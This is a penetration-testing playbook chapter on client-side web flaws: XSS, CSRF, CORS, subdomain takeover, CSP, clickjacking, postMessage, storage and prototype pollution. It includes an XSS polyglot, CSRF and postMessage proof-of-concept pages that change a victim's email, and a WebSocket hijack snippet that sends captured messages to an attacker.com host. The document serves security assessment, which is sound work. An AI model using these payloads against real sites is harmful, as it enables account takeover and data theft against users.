# Playbook 09 — Client-side

**Goal:** find vulnerabilities that live in the browser — XSS, CSRF,
clickjacking, postMessage abuse, CORS misconfig, prototype pollution,
DOM-based issues, sensitive data in browser storage.

---

## 9.1 Cross-site scripting (XSS)

### 9.1.1 Sink inventory

For every form field and URL parameter, classify the sink:
- HTML body (`<div>VALUE</div>`)
- HTML attribute (`<a href="VALUE">`, `<img src="VALUE">`)
- JavaScript context (`var x = "VALUE"`)
- URL context (`window.location = VALUE`, `<a href="VALUE">`)
- CSS context (`style="...VALUE..."`)
- JSON in script tag (`<script>const x = {"v":"VALUE"}</script>`)

Each context needs different payloads.

### 9.1.2 Polyglot for triage

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Fires in many contexts. Use for first pass; refine to context once
reflected.

### 9.1.3 Stored XSS — high-value targets

Stored XSS that fires when **another user (especially admin)** views
the data is the highest-impact form. Classic targets:

- Order link / target field — admin sees in order management.
- Support ticket subject / body — admin reads tickets.
- User profile name / display name — admin sees in user list.
- Custom branding (child-panel logo URL, custom CSS).
- Custom email templates if user-editable.
- Notification messages.
- File upload filename rendered without escaping.
- URL query param echoed in error message.

### 9.1.4 DOM XSS

Catch via Burp's DOM Invader or by reading JS for sources/sinks:

Sources: `location.hash`, `location.search`, `location.href`,
`document.referrer`, `window.name`, `postMessage`, `localStorage`,
`sessionStorage`, `document.cookie`.

Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`,
`setTimeout(string)`, `setInterval(string)`, `Function()`,
jQuery `$(input)`, `location = input`, `script.src = input`.

Common DOM-XSS pattern: `document.write(decodeURIComponent(location.hash.slice(1)))`.

### 9.1.5 Reflected XSS

Standard probes per context, captured to evidence/xss/.

---

## 9.2 CSRF

For every state-changing endpoint:

- CSRF token present in form / header?
- Token validated server-side?
- Token bound to session?
- SameSite cookie attribute set?

Test with HTML form on attacker domain auto-submitting:

```html
<form action="https://<target>/account/email" method="POST">
  <input name="email" value="attacker@example.com">
</form>
<script>document.forms[0].submit()</script>
```

If logged-in user visiting changes their email, CSRF is real.

API endpoints using `Authorization: Bearer ...` header (not cookies)
are CSRF-immune.

---

## 9.3 CORS

```bash
# What's the policy?
curl -skI -H "Origin: https://attacker.example.com" \
  "https://<target>/api/v2" | grep -i "access-control"
```

Bad signs:
- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (invalid spec; browsers reject, but pre-flight cache nuances).
- ACAO **reflecting** any Origin sent (whitelist-by-reflection).
- ACAO `null` (achievable from sandboxed iframe).
- Subdomain wildcards when subdomains aren't all trustable.

Reflective CORS + credentials = attacker domain reads authenticated
responses.

---

## 9.4 Subdomain takeover

For each subdomain found:

```bash
dig +short <sub>.<target>
# CNAME → unclaimed cloud resource = takeover
```

Common takeovers:
- AWS S3, ELB, CloudFront with no claim.
- Azure App Service, Traffic Manager.
- GCP Cloud Run, Storage.
- GitHub Pages, GitLab Pages.
- Heroku, Netlify, Vercel apps.
- Shopify, Tumblr, Fastly, Surge.sh.

Use `subjack`, `subzy`, or `nuclei -t takeovers/`.

If a subdomain is taken over, attacker hosts JS on
`<sub>.<target>`, gets SameSite cookies, defeats CSP allow-lists,
and phishes credibly.

---

## 9.5 Content Security Policy review

```bash
curl -skI "https://<target>/" | grep -i content-security
```

Check:
- `unsafe-inline` / `unsafe-eval` in script-src — defeats CSP.
- Wildcards (`*` or wide cdn allowlist).
- Allowlisted CDNs that host arbitrary user JS (jsdelivr, unpkg).
- `frame-ancestors` for clickjacking.
- `report-uri` set so CSP violations are collected.

`https://csp-evaluator.withgoogle.com/` for static analysis.

---

## 9.6 Clickjacking

```html
<iframe src="https://<target>/account/email" width="800" height="600"></iframe>
```

If renders, no `X-Frame-Options` / CSP `frame-ancestors`.

Sensitive state-changing pages in iframe with overlaid decoy buttons
= clickjacked actions.

---

## 9.7 postMessage handlers

Read JS for `addEventListener('message', ...)`. If found:
- Does the handler check `event.origin`?
- Does it accept commands from any origin?
- Does it sink into `eval`, `innerHTML`, or auth state?

PoC page:
```html
<script>
  const w = window.open("https://<target>/");
  setTimeout(() => w.postMessage({type:"changeEmail",email:"attacker@x.com"}, "*"), 3000);
</script>
```

---

## 9.8 Browser storage

Inspect after login:
```js
JSON.stringify(localStorage)
JSON.stringify(sessionStorage)
```

Findings:
- API keys, JWTs, balance, role flags stored client-side.
- Storing sensitive tokens in localStorage = XSS reads them.
- `HttpOnly` cookies are preferred for session tokens.

---

## 9.9 Prototype pollution (client-side)

Apps using older Lodash / jQuery without sanitization:

URL fragment payloads: `#__proto__[admin]=true`. Use Burp DOM Invader
to detect automatically.

Server-side prototype pollution: see playbook 08 §8.11.

---

## 9.10 Service worker / manifest

- Does the app register a service worker?
- SW scope (broad scope = bigger phishing surface if compromised).
- SW update story.
- Web App Manifest sensitive defaults.

---

## 9.11 WebSocket cross-site hijacking

If WebSocket auth is just cookie + no Origin check on handshake,
attacker page can open WS on user's behalf and read pushed messages.

```html
<script>
  const ws = new WebSocket("wss://<target>/ws/orders");
  ws.onmessage = e => fetch("https://attacker.com/x?" + encodeURIComponent(e.data));
</script>
```

---

## 9.12 Output

Findings filed individually. Phase summary:
- Stored / reflected / DOM XSS findings.
- CSRF posture.
- CORS findings.
- Subdomain takeover candidates.
- CSP grade and gaps.
- Browser storage hygiene.
- WebSocket / postMessage findings.
